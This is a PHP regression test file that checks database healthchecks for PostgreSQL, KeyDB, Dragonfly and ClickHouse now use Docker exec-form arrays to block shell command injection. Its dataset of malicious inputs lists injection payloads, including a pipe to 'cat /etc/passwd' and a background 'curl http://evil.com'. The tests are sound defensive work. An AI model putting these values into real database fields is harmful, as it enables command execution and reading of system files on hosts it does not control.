<?php

/**
 * Regression tests for database healthcheck command injection.
 *
 * Docker CMD-SHELL healthchecks pass the string to /bin/sh -c, enabling command injection
 * via user-controlled DB username/password/database fields. The fix converts all affected
 * healthchecks to CMD exec-form arrays, which bypass the shell entirely.
 */
dataset('malicious_db_inputs', [
    'semicolon separator' => ['admin; id > /tmp/pwned; echo'],
    'command substitution $()' => ['admin$(id > /tmp/pwned)'],
    'backtick substitution' => ['admin`id > /tmp/pwned`'],
    'pipe operator' => ['admin | cat /etc/passwd'],
    'background operator' => ['admin & curl http://evil.com'],
    'output redirect' => ['admin > /tmp/evil.txt'],
    'newline injection' => ["admin\nid"],
    'null byte' => ["admin\0id"],
]);

// ─── PostgreSQL ──────────────────────────────────────────────────────────────

test('postgresql healthcheck uses CMD exec-form, not CMD-SHELL', function () {
    $source = file_get_contents(__DIR__.'/../../app/Actions/Database/StartPostgresql.php');

    expect($source)->not->toContain('CMD-SHELL');
    expect($source)->toContain("'CMD', 'psql'");
});

test('postgresql healthcheck exec-form array is injection-safe regardless of input', function (string $malicious) {
    // Simulate what StartPostgresql now generates
    $healthcheck = ['CMD', 'psql', '-U', $malicious, '-d', $malicious, '-c', 'SELECT 1'];

    expect($healthcheck[0])->toBe('CMD');
    expect($healthcheck[0])->not->toBe('CMD-SHELL');
    // Malicious value is isolated as a single argv element — no shell interprets it
    expect($healthcheck)->toContain($malicious);
    expect(is_array($healthcheck))->toBeTrue();
})->with('malicious_db_inputs');

// ─── KeyDB ────────────────────────────────────────────────────────────────────

test('keydb healthcheck uses CMD exec-form, not a CMD-SHELL string', function () {
    $source = file_get_contents(__DIR__.'/../../app/Actions/Database/StartKeydb.php');

    expect($source)->not->toContain('CMD-SHELL');
    expect($source)->toContain("'CMD', 'keydb-cli'");
});

test('keydb healthcheck exec-form array is injection-safe regardless of input', function (string $malicious) {
    $healthcheck = ['CMD', 'keydb-cli', '--pass', $malicious, 'ping'];

    expect($healthcheck[0])->toBe('CMD');
    expect($healthcheck)->toContain($malicious);
    expect(is_array($healthcheck))->toBeTrue();
})->with('malicious_db_inputs');

// ─── Dragonfly ────────────────────────────────────────────────────────────────

test('dragonfly healthcheck uses CMD exec-form, not a CMD-SHELL string', function () {
    $source = file_get_contents(__DIR__.'/../../app/Actions/Database/StartDragonfly.php');

    expect($source)->not->toContain('CMD-SHELL');
    expect($source)->toContain("'CMD', 'redis-cli'");
});

test('dragonfly healthcheck exec-form array is injection-safe regardless of input', function (string $malicious) {
    $healthcheck = ['CMD', 'redis-cli', '-a', $malicious, 'ping'];

    expect($healthcheck[0])->toBe('CMD');
    expect($healthcheck)->toContain($malicious);
    expect(is_array($healthcheck))->toBeTrue();
})->with('malicious_db_inputs');

// ─── ClickHouse ───────────────────────────────────────────────────────────────

test('clickhouse healthcheck uses CMD exec-form, not a CMD-SHELL string', function () {
    $source = file_get_contents(__DIR__.'/../../app/Actions/Database/StartClickhouse.php');

    expect($source)->not->toContain('CMD-SHELL');
    expect($source)->toContain("'CMD', 'clickhouse-client'");
});

test('clickhouse healthcheck exec-form array is injection-safe regardless of input', function (string $malicious) {
    $healthcheck = ['CMD', 'clickhouse-client', '--user', $malicious, '--password', $malicious, '--query', 'SELECT 1'];

    expect($healthcheck[0])->toBe('CMD');
    expect($healthcheck)->toContain($malicious);
    expect(is_array($healthcheck))->toBeTrue();
})->with('malicious_db_inputs');

// ─── Verify unaffected databases still use their safe patterns ────────────────

test('mysql healthcheck already uses CMD exec-form (no regression)', function () {
    $source = file_get_contents(__DIR__.'/../../app/Actions/Database/StartMysql.php');

    // MySQL already used CMD array form — ensure it stays that way
    expect($source)->toContain("'CMD', 'mysqladmin'");
});

test('mariadb healthcheck uses safe fixed script (no regression)', function () {
    $source = file_get_contents(__DIR__.'/../../app/Actions/Database/StartMariadb.php');

    expect($source)->toContain('healthcheck.sh');
    // Must not have gained any user-field interpolation
    expect($source)->not->toMatch('/CMD-SHELL.*mariadb/i');
});
